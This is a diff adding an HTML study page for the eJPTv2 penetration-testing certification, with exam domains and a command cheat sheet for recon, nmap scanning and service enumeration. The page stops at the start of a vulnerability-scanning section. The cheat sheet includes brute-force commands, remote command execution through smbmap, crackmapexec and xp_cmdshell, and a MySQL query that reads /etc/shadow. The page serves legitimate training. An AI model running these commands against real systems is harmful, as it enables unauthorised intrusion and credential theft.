@@ -1,0 +1,985 @@
+<!doctype html><html><head><meta charset=utf8> <link rel="icon" type="image/png" href="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/cmcc3wze0lx3007irps13e6k3">
+ <meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>eJPTv2 Field Guide</title>
+<style>
+ 
+  :root{
+    --bg:#ffffff;
+    --surface:#faf8fd;
+    --surface-2:#f1ecfa;
+    --border:#e6ddf5;
+    --border-soft:#efe8f9;
+    --fg:#1c1830;
+    --fg-dim:#5e5578;
+    --fg-faint:#948aad;
+    --accent-a:#e8298f;
+    --accent-b:#8b2ff0;
+    --accent:#7d2ae0;
+    --accent-grad:linear-gradient(135deg,var(--accent-a),var(--accent-b));
+    --accent-soft:rgba(139,47,240,.08);
+    --accent-line:rgba(139,47,240,.3);
+    --ok:#1aa876;
+    --term-bg:#1a1530;
+    --term-bar:#231b3d;
+    --term-border:#352a55;
+    --term-fg:#e2dbf5;
+    --term-faint:#8d82ab;
+    --term-accent:#c084fc;
+    --term-ok:#5eead4;
+    --mono:'IBM Plex Mono',ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    --sans:'IBM Plex Sans',system-ui,-apple-system,Segoe UI,sans-serif;
+    --disp:'Sora',var(--sans);
+    color-scheme: light;
+  }
+  *{box-sizing:border-box}
+  html,body{background:var(--bg)}
+  body{
+    margin:0;font-family:var(--sans);color:var(--fg);background:var(--bg);
+    font-size:15px;line-height:1.55;
+    padding-left:max(16px, env(safe-area-inset-left,0px));
+    padding-right:max(16px, env(safe-area-inset-right,0px));
+  }
+  img{max-width:100%}
+  [hidden]{display:none!important}
+  a{color:var(--accent)}
+  code,pre{font-family:var(--mono)}
+  ::selection{background:var(--accent-soft);color:var(--fg)}
+  .wrap{max-width:1040px;margin:0 auto}
+
+  .grid-bg{
+    position:fixed;inset:0;z-index:-1;pointer-events:none;
+    background-image:radial-gradient(circle at 1px 1px, rgba(139,47,240,.10) 1px, transparent 1.6px);
+    background-size:34px 34px;background-position:-8px -8px;
+    mask-image:radial-gradient(ellipse 75% 50% at 50% 0%, #000 0%, transparent 70%);
+  }
+
+  header.top{
+    position:sticky;top:env(safe-area-inset-top,0px);z-index:40;
+    background:rgba(255,255,255,.88);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--border-soft);
+  }
+  body::before{
+    content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);
+    z-index:41;background:rgba(255,255,255,.88);
+  }
+  .topbar-inner{max-width:1040px;margin:0 auto;display:flex;align-items:center;gap:16px;padding-block:11px;flex-wrap:wrap}
+  .brand{display:flex;align-items:center;gap:9px;font-family:var(--disp);font-weight:700;font-size:14.5px;white-space:nowrap}
+  .brand img.ine-logo{height:22px;width:auto;display:block}
+  .brand small{display:block;font-family:var(--mono);font-weight:400;color:var(--fg-faint);font-size:10px;letter-spacing:.06em;margin-top:1px}
+  nav.topnav{display:flex;gap:2px;flex-wrap:wrap;margin-left:auto;font-family:var(--mono);font-size:12.5px}
+  nav.topnav a{color:var(--fg-dim);text-decoration:none;padding:6px 10px;border-radius:5px;border:1px solid transparent;white-space:nowrap}
+  nav.topnav a:hover{color:var(--accent);border-color:var(--border);background:var(--surface)}
+  .search-box{position:relative;flex:1 1 170px;min-width:0;max-width:230px}
+  .search-box input{width:100%;background:var(--surface);border:1px solid var(--border);color:var(--fg);font-family:var(--mono);font-size:12.5px;border-radius:6px;padding:7px 10px 7px 28px}
+  .search-box input:focus{outline:none;border-color:var(--accent-line)}
+  .search-box::before{content:"⌕";position:absolute;left:9px;top:50%;transform:translateY(-50%);color:var(--fg-faint);font-size:13px}
+
+  section{padding-block:40px}
+  .eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);display:flex;align-items:center;gap:8px;margin-bottom:10px}
+  .eyebrow::before{content:"//";color:var(--fg-faint)}
+  h1,h2,h3{font-family:var(--disp);text-wrap:balance;margin:0}
+  h2{font-size:clamp(22px,4vw,28px);font-weight:700;margin-bottom:6px}
+  .section-sub{color:var(--fg-dim);max-width:62ch;margin-top:6px;font-size:14.5px}
+
+  .hero{padding-top:30px;padding-bottom:10px;display:grid;grid-template-columns:1fr auto;gap:28px;align-items:start}
+  @media (max-width:680px){.hero{grid-template-columns:1fr}}
+  .hero-main{min-width:0}
+  .badge{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:#fff;background:var(--accent-grad);padding:6px 13px;border-radius:999px;margin-bottom:18px;box-shadow:0 4px 14px -4px rgba(139,47,240,.5)}
+  .badge::before{content:"";width:6px;height:6px;border-radius:50%;background:#fff}
+  h1.hero-title{font-size:clamp(30px,5.4vw,46px);font-weight:700;line-height:1.08;letter-spacing:-.01em}
+  h1.hero-title .accent{background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .hero-desc{color:var(--fg-dim);max-width:60ch;font-size:15.5px;margin-top:15px}
+  .hero-badge-img{width:148px;height:auto;justify-self:end;filter:drop-shadow(0 10px 24px rgba(139,47,240,.22))}
+  @media (max-width:680px){.hero-badge-img{width:104px;justify-self:start;margin-top:4px}}
+
+  .domains{display:grid;gap:12px;margin-top:28px}
+  .domain-row{display:grid;grid-template-columns:220px 1fr 50px;gap:14px;align-items:center}
+  .domain-row .name{font-size:13.3px;color:var(--fg)}
+  .domain-row .track{height:9px;border-radius:5px;background:var(--surface-2);border:1px solid var(--border-soft);overflow:hidden}
+  .domain-row .fill{height:100%;border-radius:5px;background:var(--accent-grad)}
+  .domain-row .pct{font-family:var(--mono);font-size:13px;color:var(--accent);text-align:right;font-weight:600;font-variant-numeric:tabular-nums}
+  @media (max-width:560px){.domain-row{grid-template-columns:1fr}.domain-row .pct{text-align:left}}
+
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border-soft);border:1px solid var(--border-soft);border-radius:10px;overflow:hidden;margin-top:30px}
+  .stat{background:var(--surface);padding:15px 14px;min-width:0;border-top:3px solid transparent;border-image:var(--accent-grad) 1}
+  .stat .num{font-family:var(--mono);font-size:20px;color:var(--accent);font-weight:700;font-variant-numeric:tabular-nums}
+  .stat .label{font-size:11.3px;color:var(--fg-faint);margin-top:3px;line-height:1.3}
+  @media (max-width:640px){.stats{grid-template-columns:repeat(2,1fr)}}
+
+  .obj-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:22px}
+  @media (max-width:700px){.obj-grid{grid-template-columns:1fr}}
+  .obj-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:16px 18px;position:relative;overflow:hidden}
+  .obj-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--accent-grad)}
+  .obj-card .head{display:flex;justify-content:space-between;align-items:baseline;gap:10px;margin-bottom:10px}
+  .obj-card .head h3{font-size:14.3px;font-weight:600}
+  .obj-card .head .pct{font-family:var(--mono);color:var(--accent);font-size:13px;font-weight:600}
+  .obj-card ul{margin:0;padding-left:18px;color:var(--fg-dim);font-size:13.2px;display:grid;gap:5px}
+
+  .catgroup{margin-bottom:6px}
+  .cat-head{display:flex;align-items:center;gap:10px;padding:13px 4px;cursor:pointer;border-top:1px solid var(--border-soft);user-select:none}
+  .cat-head .idx{font-family:var(--mono);font-size:11px;color:var(--accent);width:26px;flex-shrink:0;font-weight:600}
+  .cat-head h3{font-size:15.5px;flex:1;min-width:0;color:var(--fg)}
+  .cat-head .count{font-family:var(--mono);font-size:11px;color:var(--fg-faint);border:1px solid var(--border);padding:2px 7px;border-radius:999px;white-space:nowrap}
+  .cat-head .chev{color:var(--fg-faint);transition:transform .15s ease;flex-shrink:0}
+  .catgroup[open] > .cat-head .chev{transform:rotate(90deg);color:var(--accent)}
+  .cat-body{padding:4px 4px 22px;display:grid;gap:16px}
+  .cat-desc{color:var(--fg-dim);font-size:13.2px;max-width:68ch;margin:-4px 0 4px}
+
+  .term{border:1px solid var(--term-border);border-radius:8px;overflow:hidden;background:var(--term-bg);min-width:0;box-shadow:0 8px 20px -12px rgba(30,15,60,.35)}
+  .term .bar{display:flex;align-items:center;gap:8px;padding:8px 10px;background:var(--term-bar);border-bottom:1px solid var(--term-border)}
+  .term .dots{display:flex;gap:5px;flex-shrink:0}
+  .term .dots span{width:9px;height:9px;border-radius:50%;display:block}
+  .term .dots span:nth-child(1){background:#ff6b6b}
+  .term .dots span:nth-child(2){background:#f5c04a}
+  .term .dots span:nth-child(3){background:#3ddc97}
+  .term .filename{font-family:var(--mono);font-size:11.5px;color:var(--term-faint);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .term .copy{font-family:var(--mono);font-size:11px;color:var(--term-fg);background:transparent;border:1px solid var(--term-border);border-radius:5px;padding:3px 9px;cursor:pointer;flex-shrink:0}
+  .term .copy:hover{border-color:var(--term-accent);color:var(--term-accent)}
+  .term .copy.copied{color:var(--term-ok);border-color:var(--term-ok)}
+  .term pre{margin:0;padding:14px 16px;overflow-x:auto;font-size:12.6px;line-height:1.62;color:var(--term-fg)}
+  .term pre .c{color:var(--term-faint)}
+  .term pre .v{color:var(--term-accent)}
+  .term pre .k{color:var(--term-ok)}
+
+  .tool-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:24px}
+  @media (max-width:760px){.tool-grid{grid-template-columns:repeat(2,1fr)}}
+  @media (max-width:480px){.tool-grid{grid-template-columns:1fr}}
+  .tool-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:9px;padding:14px 16px;min-width:0}
+  .tool-card .t-name{font-family:var(--mono);font-weight:600;font-size:13.3px;color:var(--fg)}
+  .tool-card .t-desc{font-size:12.5px;color:var(--fg-dim);margin-top:5px}
+
+  .tips{display:grid;gap:10px;margin-top:22px}
+  .tip{display:grid;grid-template-columns:28px 1fr;gap:12px;background:var(--surface);border:1px solid var(--border-soft);border-radius:9px;padding:13px 15px}
+  .tip .n{font-family:var(--mono);color:var(--accent);font-size:13px;font-weight:700}
+  .tip .b{font-size:13.5px;color:var(--fg-dim)}
+  .tip .b strong{color:var(--fg);font-weight:600}
+
+  .author{background:var(--surface);border:1px solid var(--border-soft);border-radius:12px;padding:22px 24px;margin-top:4px;display:flex;gap:16px;align-items:flex-start;flex-wrap:wrap}
+  .author .avatar{width:50px;height:50px;border-radius:50%;background:var(--accent-grad);flex-shrink:0}
+  .author .who{min-width:0;flex:1}
+  .author .who .name{font-family:var(--disp);font-weight:700;font-size:16px}
+  .author .who .role{font-size:12.8px;color:var(--fg-faint);margin-top:1px}
+  .author .links{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;font-family:var(--mono);font-size:12.5px}
+  .author .links a{display:inline-flex;align-items:center;gap:5px;color:var(--fg-dim);text-decoration:none;border:1px solid var(--border);padding:5px 11px;border-radius:999px}
+  .author .links a:hover{color:var(--accent);border-color:var(--accent-line);background:var(--accent-soft)}
+
+  footer{border-top:1px solid var(--border-soft);padding-block:28px 40px;margin-top:30px}
+  .disclaimer{font-size:11.6px;color:var(--fg-faint);line-height:1.6;max-width:80ch}
+  .foot-links{display:flex;gap:16px;flex-wrap:wrap;font-family:var(--mono);font-size:12.3px;margin-top:14px}
+  .foot-links a{color:var(--fg-dim);text-decoration:none;border-bottom:1px dotted var(--border)}
+  .foot-links a:hover{color:var(--accent);border-color:var(--accent-line)}
+
+  .no-results{display:none;color:var(--fg-faint);font-family:var(--mono);font-size:13px;padding:30px 4px}
+</style>
+
+<div class="grid-bg"></div>
+
+<header class="top">
+  <div class="topbar-inner">
+    <div class="brand">
+      <img class="ine-logo" src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/cmderrgzq3nzs07k0d3hnu0m9" alt="INE logo">
+      <span>eJPTv2 Field Guide<small>COMMUNITY CONTENT</small></span>
+    </div>
+    <div class="search-box">
+      <input id="filterInput" type="text" placeholder="filter commands…" autocomplete="off">
+    </div>
+    <nav class="topnav">
+      <a href="#domains">Domains</a>
+      <a href="#cheatsheet">Cheat Sheet</a>
+      <a href="#tools">Tools</a>
+      <a href="#exam">Exam</a>
+      <a href="#author">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section class="hero" id="overview">
+    <div class="hero-main">
+      <span class="badge">Community Field Guide</span>
+      <h1 class="hero-title">The <span class="accent">eJPTv2</span><br>Field Guide</h1>
+      <p class="hero-desc">A practical reference for INE Security's eLearnSecurity Junior Penetration Tester (eJPTv2) exam — the four graded domains, the tools that get used in every lab, and a condensed command cheat sheet from networking through web app attacks.</p>
+    </div>
+    <img class="hero-badge-img" src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/cmcc3wze0lx3007irps13e6k3" alt="eJPT certification badge">
+
+    <div class="domains" aria-label="Exam domain weighting" style="grid-column:1/-1">
+      <div class="domain-row"><span class="name">Host &amp; Network Penetration Testing</span><div class="track"><div class="fill" style="width:35%"></div></div><span class="pct">35%</span></div>
+      <div class="domain-row"><span class="name">Assessment Methodologies</span><div class="track"><div class="fill" style="width:25%"></div></div><span class="pct">25%</span></div>
+      <div class="domain-row"><span class="name">Host &amp; Network Auditing</span><div class="track"><div class="fill" style="width:25%"></div></div><span class="pct">25%</span></div>
+      <div class="domain-row"><span class="name">Web Application Penetration Testing</span><div class="track"><div class="fill" style="width:15%"></div></div><span class="pct">15%</span></div>
+    </div>
+
+    <div class="stats" style="grid-column:1/-1">
+      <div class="stat"><div class="num">3 yrs</div><div class="label">Certification validity from award date</div></div>
+      <div class="stat"><div class="num">180d</div><div class="label">Voucher window to sit the exam</div></div>
+      <div class="stat"><div class="num">14d</div><div class="label">Free retake window if you don't pass</div></div>
+      <div class="stat"><div class="num">4</div><div class="label">Graded exam domains</div></div>
+    </div>
+  </section>
+
+  <section id="domains">
+    <div class="eyebrow">Domains + Objectives</div>
+    <h2>What the exam actually grades</h2>
+    <p class="section-sub">eJPTv2 is entry-level and hands-on: it simulates real engagement tasks rather than asking theory questions in isolation. Each domain below is scored against the objectives INE lists for it.</p>
+
+    <div class="obj-grid">
+      <div class="obj-card">
+        <div class="head"><h3>Host &amp; Network Penetration Testing</h3><span class="pct">35%</span></div>
+        <ul>
+          <li>Identify and modify public exploits</li>
+          <li>Conduct exploitation with Metasploit</li>
+          <li>Demonstrate pivoting via routes and port forwarding</li>
+          <li>Run brute-force password attacks and crack hashes</li>
+        </ul>
+      </div>
+      <div class="obj-card">
+        <div class="head"><h3>Assessment Methodologies</h3><span class="pct">25%</span></div>
+        <ul>
+          <li>Locate endpoints on a network</li>
+          <li>Identify open ports, services, and OS on a target</li>
+          <li>Pull company and email intel from public sources</li>
+          <li>Identify and triage vulnerabilities by impact</li>
+        </ul>
+      </div>
+      <div class="obj-card">
+        <div class="head"><h3>Host &amp; Network Auditing</h3><span class="pct">25%</span></div>
+        <ul>
+          <li>Compile and enumerate information from files on a target</li>
+          <li>Enumerate system and network info on a target</li>
+          <li>Gather user accounts, hashes, and passwords</li>
+          <li>Transfer files to and from a target</li>
+        </ul>
+      </div>
+      <div class="obj-card">
+        <div class="head"><h3>Web Application Penetration Testing</h3><span class="pct">15%</span></div>
+        <ul>
+          <li>Identify vulnerabilities in web applications</li>
+          <li>Locate hidden files and directories</li>
+          <li>Conduct brute-force login attacks</li>
+          <li>Carry out web app reconnaissance</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="cheatsheet">
+    <div class="eyebrow">Cheat Sheet</div>
+    <h2>The full command reference</h2>
+    <p class="section-sub">Grouped by phase, roughly in the order you'd run them. Every <code>&lt;TARGET&gt;</code>, <code>&lt;USER&gt;</code> and <code>&lt;PW&gt;</code> is a placeholder — swap in real values. Click a category to expand it, or use the filter in the top bar to jump straight to a command.</p>
+
+    <div id="catList">
+      <!-- 1 -->
+      <details class="catgroup" open data-cat>
+        <summary class="cat-head"><span class="idx">01</span><h3>Networking Basics</h3><span class="count">4 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Confirm interfaces, routes, and reachability before you touch a scanner.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">routing-and-ip.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Linux</span>
+ip route
+ip a
+ip -br -c a
+
+<span class="c"># Windows</span>
+route print
+ipconfig /all
+
+<span class="c"># Any *nix</span>
+netstat -r
+ifconfig</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">arp-and-ports.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># ARP table</span>
+ip neighbour        <span class="c"># Linux</span>
+arp -a               <span class="c"># Windows / macOS</span>
+
+<span class="c"># Listening / open ports</span>
+netstat -tunp
+netstat -tulpn
+ss -tnl
+netstat -ano          <span class="c"># Windows</span>
+lsof -n -i4TCP -i4UDP</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">connect-and-probe.sh</span><button class="copy">copy</button></div>
+            <pre>nc -v example.com 80
+nc -zv <span class="v">&lt;TARGET&gt;</span> <span class="v">&lt;PORT&gt;</span>       <span class="c"># scan a single port</span>
+
+openssl s_client -connect <span class="v">&lt;HOST&gt;</span>:<span class="v">&lt;PORT&gt;</span>
+openssl s_client -connect <span class="v">&lt;HOST&gt;</span>:<span class="v">&lt;PORT&gt;</span> -debug</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">host-discovery.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Ping sweep</span>
+sudo nmap -sn <span class="v">&lt;TARGET_IP/NETWORK&gt;</span>
+sudo arp-scan -I eth1 <span class="v">&lt;TARGET_IP/NETWORK&gt;</span>
+netdiscover -i eth1 -r <span class="v">&lt;TARGET_IP/NETWORK&gt;</span>
+
+<span class="c"># fping sweep, quiet on dead hosts</span>
+fping -I eth1 -g <span class="v">&lt;TARGET_IP/NETWORK&gt;</span> -a 2&gt;/dev/null
+
+tracert google.com     <span class="c"># Windows</span>
+traceroute google.com  <span class="c"># Linux</span></pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 2 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">02</span><h3>Information Gathering</h3><span class="count">3 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Passive recon, OSINT, and DNS — everything before a packet touches the target.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">passive-recon.sh</span><button class="copy">copy</button></div>
+            <pre>host <span class="v">&lt;HOST&gt;</span>
+whatweb <span class="v">&lt;HOST&gt;</span>
+whois <span class="v">&lt;HOST&gt;</span>
+dnsrecon -d <span class="v">&lt;HOST&gt;</span>
+
+wafw00f <span class="v">&lt;HOST&gt;</span> -a
+sublist3r -d <span class="v">&lt;HOST&gt;</span>
+theHarvester -d <span class="v">&lt;HOST&gt;</span> -b all</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">google-dorks.txt</span><button class="copy">copy</button></div>
+            <pre>site:
+inurl:
+site:*.sitename.com
+intitle:
+filetype:
+intitle:index of
+cache:
+inurl:auth_user_file.txt
+inurl:passwd.txt
+inurl:wp-config.bak</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">dns-enum.sh</span><button class="copy">copy</button></div>
+            <pre>dnsenum <span class="v">&lt;HOST&gt;</span>
+dig <span class="v">&lt;HOST&gt;</span>
+dig axfr @<span class="v">&lt;DNS_SERVER&gt;</span> <span class="v">&lt;HOST&gt;</span>
+fierce --domain <span class="v">&lt;HOST&gt;</span></pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 3 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">03</span><h3>Footprinting &amp; Port Scanning</h3><span class="count">2 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Nmap is the workhorse here — the flag combinations below cover most of what the exam's lab network needs.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">nmap-scans.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Baseline</span>
+nmap <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -Pn <span class="v">&lt;TARGET_IP&gt;</span>              <span class="c"># skip host discovery</span>
+nmap -p- <span class="v">&lt;TARGET_IP&gt;</span>               <span class="c"># all 65535 ports</span>
+nmap -p 80,445,3389,8080 <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># Service / OS / default scripts</span>
+nmap -sV <span class="v">&lt;TARGET_IP&gt;</span>
+sudo nmap -sV -O <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -sC <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -Pn -F -sV -O -sC <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># Aggressive + timing</span>
+nmap -Pn -F -A <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -Pn -F -T4 -sV -O -sC <span class="v">&lt;TARGET_IP&gt;</span> -v
+
+<span class="c"># UDP + output formats</span>
+nmap -sU <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -Pn -sV -sC -O -oA outputfile <span class="v">&lt;TARGET_IP&gt;</span></pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">network-discovery.sh</span><button class="copy">copy</button></div>
+            <pre>ping <span class="v">&lt;TARGET_IP&gt;</span>
+sudo nmap -sn <span class="v">&lt;TARGET_IP/NETWORK&gt;</span>
+sudo arp-scan -I eth1 <span class="v">&lt;TARGET_IP/NETWORK&gt;</span>
+fping -I eth1 -g <span class="v">&lt;TARGET_IP/NETWORK&gt;</span> -a</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 4 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">04</span><h3>Service Enumeration</h3><span class="count">6 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Per-service enumeration for the protocols that show up constantly in the eJPT lab network: SMB, FTP, SSH, HTTP, SQL, SMTP.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">smb-enum.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># Nmap</span>
+sudo nmap -p 445 -sV -sC -O <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -p445 --script=smb-vuln-* <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># Connect / list shares</span>
+smbclient -L <span class="v">&lt;TARGET_IP&gt;</span> -N
+smbclient -L <span class="v">&lt;TARGET_IP&gt;</span> -U <span class="v">&lt;USER&gt;</span>
+smbclient //<span class="v">&lt;TARGET_IP&gt;</span>/<span class="v">&lt;SHARE&gt;</span> -U <span class="v">&lt;USER&gt;</span>
+
+<span class="c"># SMBMap</span>
+smbmap -u guest -p "" -H <span class="v">&lt;TARGET_IP&gt;</span>
+smbmap -u <span class="v">&lt;USER&gt;</span> -p '<span class="v">&lt;PW&gt;</span>' -H <span class="v">&lt;TARGET_IP&gt;</span> -x 'id'
+smbmap -u <span class="v">&lt;USER&gt;</span> -p '<span class="v">&lt;PW&gt;</span>' -H <span class="v">&lt;TARGET_IP&gt;</span> --download 'C$\flag.txt'
+
+<span class="c"># RPC + enum4linux</span>
+rpcclient -U "" -N <span class="v">&lt;TARGET_IP&gt;</span>
+enum4linux -a -u "<span class="v">&lt;USER&gt;</span>" -p "<span class="v">&lt;PW&gt;</span>" <span class="v">&lt;TARGET_IP&gt;</span>
+nxc smb <span class="v">&lt;TARGET_IP&gt;</span> -u '' -p '' --shares</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">ftp-enum.sh</span><button class="copy">copy</button></div>
+            <pre>nmap -p21 --script ftp-anon,ftp-syst,ftp-bounce <span class="v">&lt;TARGET_IP&gt;</span>
+
+ftp <span class="v">&lt;TARGET_IP&gt;</span>
+<span class="c"># try anonymous:anonymous first</span>
+ls
+get <span class="v">&lt;FILE&gt;</span>
+put <span class="v">&lt;FILE&gt;</span>
+
+hydra -L <span class="v">&lt;USERS&gt;</span> -P <span class="v">&lt;PASSWORDS&gt;</span> <span class="v">&lt;TARGET_IP&gt;</span> -t 4 ftp</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">ssh-enum.sh</span><button class="copy">copy</button></div>
+            <pre>nmap -p22 --script ssh-auth-methods,ssh-hostkey <span class="v">&lt;TARGET_IP&gt;</span>
+nmap -p22 --script=ssh-brute --script-args userdb=<span class="v">&lt;USERS&gt;</span> <span class="v">&lt;TARGET_IP&gt;</span>
+
+ssh <span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET_IP&gt;</span>
+hydra -l <span class="v">&lt;USER&gt;</span> -P <span class="v">&lt;WORDLIST&gt;</span> <span class="v">&lt;TARGET_IP&gt;</span> ssh</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">http-enum.sh</span><button class="copy">copy</button></div>
+            <pre>nmap -p80,443 --script http-enum,http-title,http-headers,http-methods <span class="v">&lt;TARGET_IP&gt;</span>
+
+whatweb <span class="v">&lt;TARGET_IP&gt;</span> -v
+nikto -h http://<span class="v">&lt;TARGET_IP&gt;</span>
+
+gobuster dir -u http://<span class="v">&lt;TARGET_IP&gt;</span> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
+feroxbuster -u http://<span class="v">&lt;TARGET_IP&gt;</span> -w common.txt -x php,html,txt -r
+ffuf -u http://<span class="v">&lt;TARGET_IP&gt;</span>/FUZZ -w common.txt
+
+curl -I http://<span class="v">&lt;TARGET_IP&gt;</span>
+curl --digest -u <span class="v">&lt;USER&gt;</span>:<span class="v">&lt;PW&gt;</span> http://<span class="v">&lt;TARGET_IP&gt;</span>/<span class="v">&lt;DIR&gt;</span></pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">sql-enum.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># MySQL</span>
+nmap -p3306 --script=mysql-info,mysql-empty-password <span class="v">&lt;TARGET_IP&gt;</span>
+mysql -h <span class="v">&lt;TARGET_IP&gt;</span> -u root -p
+<span class="k">show databases;</span> <span class="k">use</span> <span class="v">&lt;DB&gt;</span>; <span class="k">select load_file("/etc/shadow");</span>
+
+<span class="c"># MSSQL</span>
+nmap -p1433 --script ms-sql-info,ms-sql-empty-password <span class="v">&lt;TARGET_IP&gt;</span>
+impacket-mssqlclient <span class="v">&lt;USER&gt;</span>:<span class="v">&lt;PW&gt;</span>@<span class="v">&lt;TARGET_IP&gt;</span>
+<span class="c"># inside mssqlclient:</span>
+enable_xp_cmdshell ; xp_cmdshell whoami</pre>
+          </div>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">smtp-rdp-winrm.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># SMTP</span>
+nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay <span class="v">&lt;TARGET_IP&gt;</span>
+smtp-user-enum -M VRFY -U <span class="v">&lt;USERS&gt;</span> -t <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># RDP</span>
+nmap -p3389 --script rdp-ntlm-info <span class="v">&lt;TARGET_IP&gt;</span>
+xfreerdp /u:<span class="v">&lt;USER&gt;</span> /p:'<span class="v">&lt;PW&gt;</span>' /v:<span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># WinRM</span>
+evil-winrm -i <span class="v">&lt;TARGET_IP&gt;</span> -u '<span class="v">&lt;USER&gt;</span>' -p '<span class="v">&lt;PW&gt;</span>'
+crackmapexec winrm <span class="v">&lt;TARGET_IP&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PW&gt;</span> -x "whoami"</pre>
+          </div>
+        </div>
+      </details>
+
+      <!-- 5 -->
+      <details class="catgroup" data-cat>
+        <summary class="cat-head"><span class="idx">05</span><h3>Vulnerability Scanning</h3><span class="count">2 panels</span><span class="chev">›</span></summary>
+        <div class="cat-body">
+          <p class="cat-desc">Named CVE checks you'll run constantly, plus how to pull candidate exploits once a service and version are confirmed.</p>
+          <div class="term" data-term>
+            <div class="bar"><div class="dots"><span></span><span></span><span></span></div><span class="filename">named-cve-checks.sh</span><button class="copy">copy</button></div>
+            <pre><span class="c"># EternalBlue (MS17-010)</span>
+nmap --script smb-vuln-ms17-010 -p 445 <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># Heartbleed</span>
